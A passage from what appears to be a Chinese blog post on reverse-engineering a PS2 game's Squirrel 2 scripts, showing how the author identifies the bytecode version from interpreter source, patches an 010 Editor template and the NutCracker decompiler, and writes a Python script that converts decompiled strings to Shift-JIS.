変数復帰</span><br><span class="line">        f = clone savef;</span><br><span class="line">        // 時間復帰</span><br><span class="line">        currentTick = savef.time;</span><br><span class="line">        prevSkipMode = null;</span><br><span class="line">        currentText = &quot;&quot;;</span><br><span class="line">        status = RUN;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dm(&quot; ロード失敗 &quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次のシナリオに接続</span><br><span class="line"> */</span><br><span class="line">function goToNext(next) &#123;</span><br><span class="line">    clearInfo();</span><br><span class="line">    curStorage = next;</span><br><span class="line">    lines = getScene(curStorage);</span><br><span class="line">    savef = clone f;</span><br><span class="line">    savePrepare();</span><br><span class="line">    status = RUN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这三个函数名以及注释，连蒙带猜可能 <code>lines</code> 在每次加载新场景时，该场景内部所有的对话被 <code>getScene</code> 统一读入 <code>lines</code> 中。看看位于同一文件的 <code>getScene</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * シーンファイルを変換してデータとして取得する</span><br><span class="line"> * @param name シーン名</span><br><span class="line"> */</span><br><span class="line">function getScene(name) &#123;</span><br><span class="line">    // グローバルのシーン取得関数を使う</span><br><span class="line">    try &#123; </span><br><span class="line">        return ::getScene(name)();</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        dm(&quot;error in loading:&quot; + e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数 <code>name</code> 是场景名，很有可能是字符串。根据注释“转换场景文件作为数据获取”，证明我们的猜测可能是正确的。在 <code>Squirrel</code> 中函数或变量名前的 <code>::</code> 代表调用的全局空间的函数而不是类函数，因此调用的是全局空间的同名函数。该全局函数返回值也是一个可调用的对象，可能也是回调函数。</p><blockquote><p>Global variables are stored in a table called the root table. Usually in the global scope the environment object is the root table, but to explicitly access the closure root of the function from another scope, the slot name must be prefixed with ‘::’</p></blockquote><p>然而在所有的明文脚本代码中并没有找到任何全局 <code>getScene</code> 的定义。很明显这个函数不是标准库函数，实际上脚本中出现了不少类似调用没有定义的函数，例如前文的 <code>Talk</code>，这类函数甚至在字节码中也找不到符号，推测这些函数可能定义在二进制程序中，测试一下</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/22.jpg" alt="Not Found"></p><p>果然，在游戏主程序 <code>SLPS_258.97</code> 中，除了调用字符串，还出现了单独的符号，那么接下来就是针对 32 位 MIPS 程序 <code>SLPS_258.97</code> 的逆向，不过还是得先看看剩下的几个 <code>.cnut</code> 字节码文件里有没有值得关注的信息，首先需要想办法反编译 <code>.cnt</code>。</p><h1 id="字节码反编译"><a href="# 字节码反编译" class="headerlink" title="字节码反编译"></a>字节码反编译 </h1><p> 对于反编译来说，Squirrel 是一个比较坑的语言，兼容性极差，甚至每个小版本的字节码都不一样，并且 <code>.cnut</code> 文件中没有标注是哪个版本的 Squirrel，因此反编译及其困难。</p><p>目前已经有的针对 Squirrel 的反编译器主要有以下 3 个：</p><ol><li><a href="http://www.mediafire.com/?ruulm32z36i5dff">NutCracker - DamianXVI</a></li><li><a href="https://github.com/darknesswind/NutCracker">NutCracker - darknesswind</a></li><li><a href="https://github.com/SydMontague/NutCracker">NutCracker - SydMontague</a></li></ol><p>其中的 2 和 3 都是基于 1 的改进，而 1 最初来源 <a href="http://cheatengine.org/forum/viewtopic.php?p=5477214&sid=00a71666ea27fea14168c6d158f69724">CE 论坛</a>，仅支持 32 位的 Squirrel 2.2.4，不支持 unicode 编码。而 2 基于 1 实现了同版本 64 位的反编译，3 基于 1 实现了针对 Squirrel3 的反编译，同时支持 unicode 编码，此外还提供了一个 010 Editor 的模版供分析。很明显，在这个上古游戏的时代必不可能用 Squirrel3 开发，因此只能是 Squirrel2 的某个版本。查看一下 Squirrel2 的<a href="https://sourceforge.net/projects/squirrel/files/squirrel2/"> 历史版本</a>，主要有以下 15 个稳定版本：<code>2.0</code>，<code>2.0.[1-5]</code>，<code>2.1</code>，<code>2.1.[1-2]</code>，<code>2.2</code>，<code>2.2.[1-5]</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/31.jpg" alt="Not Found"></p><p>以上 3 个工具反编译我们提取出的字节码全部失败，那么我们就需要自己魔改其中的一个，由于 3 提供了 010 的模版，因此先用 3 来验证一下我们提取出的字节码是哪个版本。由于明文脚本中使用了大量双字节日语，因此为了避免干扰我们的分析，我们找一个最小的，没有出现日文的 <code>41_e2000_36f.nut</code> 用 010 分析一下。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/29.jpg" alt="Not Found"></p><p>不出意外，果然失败了，先分析一下为什么失败。模版是针对 Squirrel3 的字节码，因此看看模版里定义的结构和我们的文件有什么不同。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/30.jpg" alt="Not Found"></p><p>首先是 2 个字节的 <code>fafa</code>，然后是 4 个字节的 <code>RIQS</code>，然后是 4 个字节的 <code>sizeChar</code>，但是在模版中接下来就是用于分片的 <code>TRAP</code>，少了 <code>sizeInt</code> 以及 <code>sizeFloat</code>。考虑到这个游戏的发行年份，我们找一个 Squirrel 2.2.4 的源码分析一下 Squirrel 2 的 <code>.cnut</code> 字节码结构是什么样的。</p><p>首先找找字节码文件头 <code>0xfafa</code> 的定义，在 <code>squirrel/sqapi.cpp</code> 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SQ_BYTECODE_STREAM_TAG    0xFAFA</span></span><br></pre></td></tr></table></figure><p>然后找找 <code>SQ_BYTECODE_STREAM_TAG</code> 的引用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SQRESULT <span class="title">sq_readclosure</span><span class="params">(HSQUIRRELVM v,SQREADFUNC r,SQUserPointer up)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQObjectPtr closure;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> tag;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">r</span>(up,&amp;tag,<span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sq_throwerror</span>(v,_SC(<span class="string">&quot;io error&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(tag != SQ_BYTECODE_STREAM_TAG)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sq_throwerror</span>(v,_SC(<span class="string">&quot;invalid stream&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(!SQClosure::<span class="built_in">Load</span>(v,up,r,closure))</span><br><span class="line">        <span class="keyword">return</span> SQ_ERROR;</span><br><span class="line">    v-&gt;<span class="built_in">Push</span>(closure);</span><br><span class="line">    <span class="keyword">return</span> SQ_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查完文件头后进入 <code>squirrel/sqobject.cpp</code> 的 <code>SQClosure::Load</code> 加载字节码文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQClosure::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_HEAD));</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,<span class="built_in">sizeof</span>(SQChar)));</span><br><span class="line">    SQObjectPtr func;</span><br><span class="line">    _CHECK_IO(SQFunctionProto::<span class="built_in">Load</span>(v,up,read,func));</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_TAIL));</span><br><span class="line">    ret = SQClosure::<span class="built_in">Create</span>(_ss(v),_funcproto(func));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SQ_CLOSURESTREAM_HEAD</code> 就是小端的 <code>SQIR</code>，检查完后读取 4 个字节的 <code>sizeof(SQChar)</code>，因此在 Squirrel2 中没有 <code>sizeInt</code> 以及 <code>sizeFloat</code>，读取完后进入 <code>SQFunctionProto::Load</code>，看名字应该是读函数。那么我们先修改模版，注释掉 <code>NutHeader</code> 的 <code>sizeInt</code> 以及 <code>sizeFloat</code> 看看解析结果。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/32.jpg" alt="Not Found"></p><p>果然又失败了，看看报错原因发现是没有匹配到 <code>TRAP</code>，那么代表肯定在模版中多了几个字节。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/33.jpg" alt="Not Found"></p><p>通过核对数据，发现这里匹配失败，<code>TRAP</code> 被解析成了 <code>nFunctions</code>，那么再看看模版中 <code>NutFunction</code> 结构。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/34.jpg" alt="Not Found"></p><p>其中的 <code>ConfirmOnPart</code> 就是读取 4 个字节检查是否是 <code>TRAP</code>。很明显，<code>nFunctions</code>前面多了 4 个字节才导致识别错位到下一个 <code>TRAP</code>，继续看看 <code>Squirrel 2.2.4</code> 的源码中定义的结构。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQFunctionProto::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQInteger i, nliterals,nparameters;</span><br><span class="line">    SQInteger noutervalues ,nlocalvarinfos ;</span><br><span class="line">    SQInteger nlineinfos,ninstructions ,nfunctions,ndefaultparams ;</span><br><span class="line">    SQObjectPtr sourcename, name;</span><br><span class="line">    SQObjectPtr o;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, sourcename));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, name));</span><br><span class="line">    </span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nliterals, <span class="built_in">sizeof</span>(nliterals)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nparameters, <span class="built_in">sizeof</span>(nparameters)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;noutervalues, <span class="built_in">sizeof</span>(noutervalues)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlocalvarinfos, <span class="built_in">sizeof</span>(nlocalvarinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlineinfos, <span class="built_in">sizeof</span>(nlineinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ndefaultparams, <span class="built_in">sizeof</span>(ndefaultparams)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ninstructions, <span class="built_in">sizeof</span>(ninstructions)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nfunctions, <span class="built_in">sizeof</span>(nfunctions)));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这里的结构和模版中一样，那么可以证明我们需要的 Squirrel2 版本一定小于 2.2.4，可以进一步缩小我们的目标范围。那么继续分析 2.2.4 之前的版本，最后在 2.1.2 中发现缺少了 <code>ndefaultparams</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQFunctionProto::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQInteger i, nliterals,nparameters;</span><br><span class="line">    SQInteger noutervalues ,nlocalvarinfos ;</span><br><span class="line">    SQInteger nlineinfos,ninstructions ,nfunctions ;</span><br><span class="line">    SQObjectPtr sourcename, name;</span><br><span class="line">    SQObjectPtr o;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, sourcename));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, name));</span><br><span class="line">    </span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nliterals, <span class="built_in">sizeof</span>(nliterals)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nparameters, <span class="built_in">sizeof</span>(nparameters)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;noutervalues, <span class="built_in">sizeof</span>(noutervalues)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlocalvarinfos, <span class="built_in">sizeof</span>(nlocalvarinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlineinfos, <span class="built_in">sizeof</span>(nlineinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ninstructions, <span class="built_in">sizeof</span>(ninstructions)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nfunctions, <span class="built_in">sizeof</span>(nfunctions)));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 010 的模版中注释掉下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nDefaultParams</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (!ConfirmOnPart()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (nDefaultParams)</span><br><span class="line">    DefaultParams <span class="title function_">m_DefaultParams</span><span class="params">(nDefaultParams)</span>;</span><br></pre></td></tr></table></figure><p>继续运行模版，报了新的错</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/35.jpg" alt="Not Found"></p><p>这次是模版本身报错，原因是文件解析完毕后没有找到最后的 <code>LIAT</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NutEnd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> magicTAIL[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> (magicTAIL != <span class="string">&quot;LIAT&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Warning(<span class="string">&quot;Confirm End Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>验证一下，果然把文件中最后的 <code>LIAT</code> 解析成了 <code>m_VarParams</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/36.jpg" alt="Not Found"></p><p>既然没有报 <code>TRAP</code> 的错，那么就表示在 <code>nFunctions</code> 后出现了问题，看一下模版，在 <code>nFunctions</code> 后主要有三个数据</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/37.jpg" alt="Not Found"></p><p>还是再回到 Squirrel 2.1.2 的源码中，看看结构最后是不是有这三个数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">_CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, f-&gt;_instructions, <span class="built_in">sizeof</span>(SQInstruction)*ninstructions));</span><br><span class="line"></span><br><span class="line">_CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nfunctions; i++)&#123;</span><br><span class="line">    _CHECK_IO(_funcproto(o)-&gt;<span class="built_in">Load</span>(v, up, read, o));</span><br><span class="line">    f-&gt;_functions[i] = o;</span><br><span class="line">&#125;</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_stacksize, <span class="built_in">sizeof</span>(f-&gt;_stacksize)));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_bgenerator, <span class="built_in">sizeof</span>(f-&gt;_bgenerator)));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_varparams, <span class="built_in">sizeof</span>(f-&gt;_varparams)));</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>居然都有，那么再看看这三个数据的大小。在 <code>squirrel/sqfuncproto.h</code> 中找到这三个数据的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQInteger _stacksize;</span><br><span class="line"><span class="type">bool</span> _bgenerator;</span><br><span class="line"><span class="type">bool</span> _varparams;</span><br></pre></td></tr></table></figure><p>这时候就看出来问题了，在模版中最后的 <code>m_VarParams</code> 是 4 个字节的 int，但是在源码中却是 1 个字节的 bool，修改模版将 <code>int m_VarParams</code> 改成 <code>char m_VarParams</code> 后再次运行，这次就执行成功了，代表我们的修改全部都是正确的，并且 Squirrel 的版本一定小于等于 2.1.2。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/38.jpg" alt="Not Found"></p><p>确定了大致的版本以后，由于版本 2.1.2 太过古老，我们先尝试修改第一个最初的 <a href="http://www.mediafire.com/?ruulm32z36i5dff">NutCracker - DamianXVI</a> 来使其兼容 Squirrel 2.1.2，NutCracker 用 Visual Studio 开发，为了避免不必要的麻烦还是在 VS 下编辑运行最好，同时需要在项目 - 属性里设置 Windows SDK 版本以及平台工具集。</p><p>首先按照我们在 010 模版中修改的步骤，在 NutCracker 修改文件格式相关的代码。在 <code>nutcracker/NutScript.cpp</code> 的 <code>NutFunction::Load</code> 中注释以下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">int</span> nDefaultParams = reader.<span class="built_in">ReadInt32</span>();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">reader.<span class="built_in">ConfirmOnPart</span>();</span><br><span class="line"></span><br><span class="line">m_DefaultParams.<span class="built_in">resize</span>(nDefaultParams);</span><br><span class="line"><span class="keyword">if</span> (nDefaultParams)</span><br><span class="line">&#123;</span><br><span class="line">    reader.<span class="built_in">Read</span>(&amp;(m_DefaultParams.<span class="built_in">at</span>(<span class="number">0</span>)), nDefaultParams * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>之后编译运行一下是否可以反编译。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/40.jpg" alt="Not Found"></p><p>反编译成功，但是缺点是不支持类似 Shift-JIS 的双字节编码</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/41.jpg" alt="Not Found"></p><p>写个脚本转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: transfor.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Convert string in double qoute to ja_jp.shiftjis.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    invisible = [<span class="number">0</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>]</span><br><span class="line">    filename = filename.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    ext = filename[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&quot;</span>.join(filename[:-<span class="number">1</span>]) + <span class="string">&quot;_shiftjis.&quot;</span> + ext, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        length = <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">while</span> i &lt; length:</span><br><span class="line">            c = data[i]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> invisible:</span><br><span class="line">                <span class="keyword">if</span> c == <span class="number">0x22</span>:</span><br><span class="line">                    j = i + <span class="number">1</span></span><br><span class="line">                    string = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">while</span> data[j] != <span class="number">0x22</span>:</span><br><span class="line">                        cc = data[j]</span><br><span class="line">                        <span class="keyword">if</span> cc <span class="keyword">not</span> <span class="keyword">in</span> invisible:</span><br><span class="line">                            string += <span class="built_in">chr</span>(cc)</span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;\\x00&quot;</span> <span class="keyword">in</span> string:</span><br><span class="line">                        string = <span class="built_in">eval</span>(</span><br><span class="line">                            <span class="string">&#x27;b&quot;&#x27;</span> + string.replace(<span class="string">&quot;\\x00&quot;</span>, <span class="string">&quot;\\x&quot;</span>) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">                        ).decode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line">                        string = string.replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\\r&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line">                    f.write(<span class="string">b&#x27;&quot;%s&quot;&#x27;</span> % string.encode())</span><br><span class="line">                    i = j</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="built_in">chr</span>(c).encode())</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>批量转换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> 3[2-9]*.nut | xargs -I &#123;&#125; python3 ./transfor.py &#123;&#125;</span><br><span class="line">python3 ./transfor.py 41.nut</span><br></pre></td></tr></table></figure><p>最后终于正确反编译了全部 10 个 